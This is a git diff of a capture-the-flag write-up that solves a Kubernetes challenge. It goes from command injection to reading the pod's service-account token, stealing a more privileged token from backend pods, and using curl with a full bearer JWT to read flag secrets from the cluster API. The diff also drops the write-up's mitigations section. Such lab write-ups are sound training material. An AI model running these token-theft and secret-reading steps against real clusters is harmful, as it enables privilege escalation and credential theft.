@@ -1,24 +1,17 @@
-# Kubernetes CTF Writeup - Mini Kubernetes Challenge
+# Mini Kubernetes
 
-## Overview
-This CTF involves exploiting a Kubernetes cluster with vulnerable RBAC configurations to capture 3 flags.
+This CTF involves exploiting a Kubernetes misconfigurations to capture 3 flags.
 
-**References:**
-- [K8s LAN Party CTF Writeup](https://arnavtripathy98.medium.com/solving-a-kubernetes-ctf-k8s-lan-party-c773190e9246)
-- [Kubernetes Hacking Challenge at Area41](https://www.redguard.ch/blog/2024/06/12/kubernetes-hacking-challenge-at-area41/)
-
----
+## Tools Used
+- `kubectl` - Pre-installed in pod
 
 ## Initial Recon
-
-### Step 1: Access the vulnerable application
 
 URL: `http://77.42.16.86:30000/`
 
 The web app has a command injection vulnerability allowing RCE.
 
-### Step 2: Enumerate the environment
-
+One liner command to enumerate the environment:
 ```bash
 whoami; id; hostname; env | grep -i kube; env | grep -i flag; env; cat /proc/mounts; df -h; ip addr; cat /etc/resolv.conf; ps aux; which kubectl; which curl; which wget; which tcpdump; cat /run/secrets/kubernetes.io/serviceaccount/token; cat /run/secrets/kubernetes.io/serviceaccount/namespace;
 ```
@@ -115,9 +108,7 @@ frontend
 
 ---
 
-## Exploring Permissions
-
-### Step 3: Check what we can do
+## Permissions
 
 ```bash
 /app/kubectl auth can-i --list
@@ -127,28 +118,23 @@ The `frontend-sa` has limited permissions - mainly just list namespaces.
 
 <img width="1065" height="609" alt="image" src="https://github.com/user-attachments/assets/a99983b0-5aab-43cc-97ad-cafa3d460504" />
 
-### Step 4: Discover namespaces
+### Discover namespaces
 
 ```bash
 /app/kubectl get namespaces
 ```
 <img width="452" height="350" alt="image" src="https://github.com/user-attachments/assets/b5679188-899c-4cb8-8297-54605defda3e" />
 
-### Step 5: Check backend namespace
+There are few namespaces, but let's checks if we can list backend pods running. 
 
 ```bash
 /app/kubectl get pods -n backend
 ```
-
 Found multiple `backend-api` pods running (during the challenge on going, the screenshot was when ctf ended)
 
 <img width="661" height="131" alt="image" src="https://github.com/user-attachments/assets/972e6560-d521-4887-a99b-43d0af42d3fd" />
 
----
-
-## Token Theft Attack
-
-### Step 6: Steal backend token
+### Steal backend token
 
 Since we can exec into backend pods, let's steal their service account token:
 
@@ -162,13 +148,9 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6ImtkUmNLUVhKaE1nd3lneENNQjBIS0JKUkhHYWx5SVJ6ZURqMmc3
 
 This `backend-sa` token has higher privileges than our `frontend-sa`.
 
----
+### Search all namespaces for secrets
 
-## Hunting for Flags
-
-### Step 7: Search all namespaces for secrets
-
-Using the stolen backend-sa token to scan for flag secrets:
+Using the stolen **backend-sa** token to scan for flag secrets:
 
 ```bash
 for ns in frontend backend default win-namespace kube-system; do echo "=== Checking $ns for flags==="; curl -sk -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/$ns/secrets 2>/dev/null | grep '"name"' | grep -E "flag|final|win"; done
@@ -183,7 +165,7 @@ for ns in frontend backend default win-namespace kube-system; do echo "=== Check
 
 ## Capturing the Flags
 
-### Flag 1: Initial Compromise (410 points)
+### Flag 1: Initial Compromise
 
 ```bash
 curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/frontend/secrets/flag1 2>/dev/null | grep '"flag"' | cut -d'"' -f4 | base64 -d
@@ -203,7 +185,7 @@ curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dT
 
 ---
 
-### Flag 3: Master Treasure (390 points)
+### Flag 3: Master Treasure
 
 ```bash
 curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/win-namespace/secrets/flag3-master-treasure 2>/dev/null | grep '"flag"' | cut -d'"' -f4 | base64 -d
@@ -211,31 +193,9 @@ curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dT
 
 **Flag:** `RE:CTF{you_are_k8s_master_congratulations}`
 
----
 
-## Summary
-
-**Attack Path:**
-1. RCE in Flask app → Gained shell in frontend pod
-2. Limited `frontend-sa` permissions → Could only list namespaces  
-3. Found backend pods → Exec'd in and stole `backend-sa` token
-4. `backend-sa` had secret read permissions → Retrieved all 3 flags
-
-**Key Vulnerabilities:**
-- Overly permissive RBAC (exec across namespaces)
-- Service account with excessive permissions
-- No network segmentation between namespaces
-
-**Mitigations:**
-- Use least-privilege RBAC
-- Disable `automountServiceAccountToken` when not needed
-- Implement network policies
-- Never run containers as root
-- Regular RBAC audits
-
----
-
-## Tools Used
-- `kubectl` - Pre-installed in pod
+**References:**
+- [K8s LAN Party CTF Writeup](https://arnavtripathy98.medium.com/solving-a-kubernetes-ctf-k8s-lan-party-c773190e9246)
+- [Kubernetes Hacking Challenge at Area41](https://www.redguard.ch/blog/2024/06/12/kubernetes-hacking-challenge-at-area41/)
 - `curl` - Direct K8s API requests
 - `base64` - Decode secrets
